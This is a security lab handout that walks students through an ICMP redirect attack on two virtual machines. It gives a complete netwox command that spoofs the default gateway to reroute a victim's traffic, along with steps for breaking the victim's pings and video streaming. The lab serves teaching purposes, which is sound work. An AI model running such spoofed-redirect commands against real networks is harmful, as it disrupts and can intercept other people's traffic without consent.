## ICMP Redirect Attack

### Requirement

In this lab, you will disrupt a victim machine's ICMP traffic using the ICMP redirect attack; and then, using the same attack, you disrupt a victim's video streaming service.

### Setup

2 Linux VMs. VM1 as the victim; VM2 as the attacker. The 2 VMs do not need to be in the same network - however, this lab has only been tested when the two VMs are in the same network.

| VM  |  IP Address   |   Role   |
|-----|---------------|----------|
| VM1 | 172.16.77.128 |  victim  |
| VM2 | 172.16.77.129 | attacker |

### Preparation steps:

This attack only requires one netwox command, let's prepare the command first. This command is: sudo netwox 86 --device "ens33" --filter "src host victim_ip_address" --gw "attacker_ip_address" --src-ip "trusted_gateway_ip_address" --code 1

what this command does is: the attacker, mimicking the default gateway, sends an icmp redirect message to tell the victim: hey, please, going forward, use the attacker's ip address as your new gateway.

1. if the attacker's network interface card is not named "ens33", then change "ens33" to the network interface card's name.
2. replace "victim_ip_address" with your victim's IP address.
3. replace "attacker_ip_address" with your attacker's IP address.
4. find "trusted_gateway_ip_address" with netstat -r command. Following is an example, run netstat -r on the victim VM.

```console
[02/14/22]seed@VM:~$ netstat -r
Kernel IP routing table
Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
default         172.16.77.2     0.0.0.0         UG        0 0          0 ens33
link-local      *               255.255.0.0     U         0 0          0 ens33
172.16.77.0     *               255.255.255.0   U         0 0          0 ens33
[02/14/22]seed@VM:~$ 
```

The above command says 172.16.77.2 is the default gateway, so that's the gateway the victim machine trusts. Therefore, let's assume the victim's ip address is 172.16.77.128, and the attacker's ip address is 172.16.77.129, then we should come up with this following command:

sudo netwox 86 --device "ens33" --filter "src host 172.16.77.128" --gw "172.16.77.129" --src-ip "172.16.77.2" --code 1

question: can you find out what "--code 1" means?

### Attack steps:

1. victim, run: 

```console
$ ping www.google.com
```

make sure your ping command works and you do get responses from google, otherwise this lab makes no sense. if ping works, press ctrl-c to stop the ping command and move on to step 2.

2. attacker, run that attack command: 

```console
$ sudo netwox 86 --device "ens33" --filter "src host 172.16.77.128" --gw "172.16.77.129" --src-ip "172.16.77.2" --code 1
```

3. victim, run: 

```console
$ ping www.google.com (this time it should still succeed)
```

4: attacker, press ctrl-c to stop the attack command.

5: victim, run: 

```console
$ ping www.google.com (this time it should fail, thus it proves the attack is successful.)
```

the next two steps attempt a new attack which disrupts the victim's video streaming service:

6: victim, open firefox, watch some youtube video.

7: attacker, run the exact same attack command as before: 

```console
$ sudo netwox 86 --device "ens33" --filter "src host 172.16.77.128" --gw "172.16.77.129" --src-ip "172.16.77.2" --code 1 (if successful, victim won't be able to watch the youtude video)
```
